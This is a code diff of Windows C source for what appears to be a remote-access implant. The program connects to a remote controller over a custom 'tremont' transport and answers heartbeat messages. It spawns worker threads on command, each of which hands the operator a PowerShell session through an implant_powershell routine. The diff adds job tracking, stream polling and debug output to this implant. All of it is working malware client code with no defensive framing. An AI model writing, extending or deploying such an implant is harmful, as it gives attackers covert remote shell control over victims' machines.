@@ -14,17 +14,26 @@
 struct transport_pcb_t* emergency_pcb_pointer;
 
 struct new_thread_params_t {
-    Tremont_Nexus* nexus;
     tremont_stream_id stream_id;
+    Tremont_Nexus* nexus;
+
+    struct jobs_t* jobs;
+    HANDLE self;
 };
 
 DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
     struct wrkr_msg_t msg;
     tremont_recv(params->stream_id,
-        &msg, sizeof(msg), params->nexus);
+        (byte*)&msg, sizeof(msg), params->nexus);
     
     switch (msg.msg_enum) {
     case POWERSHELL: {
+        struct wrkr_msg_t res;
+        res.msg_enum = POWERSHELL;
+        res.powershell.res.allowed = 1;
+        tremont_send(params->stream_id,
+            (byte*) & res, sizeof(res), params->nexus);
+
         implant_powershell(params->stream_id, params->nexus);
         break;
     }
@@ -38,6 +47,7 @@ DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
     }
     }
 
+    untrack_job(params->self, params->jobs);
     free(params);
     return 0;
 }
@@ -56,7 +66,11 @@ int main() {
         //perror("Unable to init transport!\n");
         exit(-1);
     }
+
     emergency_pcb_pointer = &transport_pcb;
+
+    struct jobs_t jobs;
+    memset(&jobs, 0, sizeof(jobs));
 
     struct addrinfo* raddrinfo = transport_pcb.remote_addrinfo;
     Tremont_Nexus* nexus = transport_pcb.nexus;
@@ -68,35 +82,38 @@ int main() {
         Control thread will never send any data on the worker streams.
     */
     while (res != -1) {
+        res = tremont_poll_stream(CTRL_STREAM, nexus);
+        if (res == 0) continue;
         res = tremont_recv(CTRL_STREAM,
-            &ctrl_msg, 
-            sizeof(struct ctrl_msg_t), 
+            (byte*)&ctrl_msg,
+            sizeof(ctrl_msg),
             nexus);
+        printf("received ctrl_msg\n");
         switch (ctrl_msg.msg_enum) {
         case HEARTBEAT: {
             struct ctrl_msg_t heartbeat_res;
             heartbeat_res.msg_enum = HEARTBEAT;
             heartbeat_res.heartbeat.sanity = 1;
 
-            tremont_send(CTRL_STREAM, &heartbeat_res, sizeof(heartbeat_res), nexus);
+            tremont_send(CTRL_STREAM, (byte*)&heartbeat_res, sizeof(heartbeat_res), nexus);
         }
         case NEW_THREAD: {
+            printf("received thread request\n");
             tremont_stream_id new_stream = ctrl_msg.new_thread.stream_info.stream_id;
             char* auth = ctrl_msg.new_thread.stream_info.password;
             tremont_auth_stream(new_stream, auth, STREAM_PASS_LEN, nexus);
 
             int res = -1;
             while (res != 0) {
-                tremont_req_stream(new_stream, raddrinfo->ai_addr, 3, nexus);
+                printf("sending syn for stream %d\n", new_stream);
+                res = tremont_req_stream(new_stream, raddrinfo->ai_addr, 3, nexus);
             }
 
             struct new_thread_params_t* params = calloc(1, sizeof(*params));
             if (params == 0) continue;
             params->nexus = nexus;
             params->stream_id = new_stream;
-
-            HANDLE thread_handle;
-            thread_handle = CreateThread(
+            params->self = CreateThread(
                 NULL,
                 0,
                 wrkr_thread,
@@ -104,6 +121,7 @@ int main() {
                 0,
                 0
             );
+            track_job(params->self, &jobs);
         }
         default:
             continue;
@@ -126,7 +144,7 @@ BOOL WINAPI ConsoleHandler(DWORD signal) {
     case CTRL_BREAK_EVENT:
     case CTRL_LOGOFF_EVENT:
     case CTRL_SHUTDOWN_EVENT:
-        tremont_send(CTRL_STREAM, &byebye, sizeof(byebye), nexus);
+        tremont_send(CTRL_STREAM, (byte*)&byebye, sizeof(byebye), nexus);
         break;
     }
     return FALSE;
@@ -142,7 +160,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
     case WM_CLOSE:
         DestroyWindow(hwnd);
     case WM_DESTROY:
-        tremont_send(CTRL_STREAM, &byebye, sizeof(byebye), nexus);
+        tremont_send(CTRL_STREAM, (byte*)&byebye, sizeof(byebye), nexus);
     }
     return 0;
 }
